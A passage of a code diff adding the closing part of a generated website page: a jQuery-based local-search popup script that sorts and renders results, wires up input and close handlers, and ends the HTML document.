+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
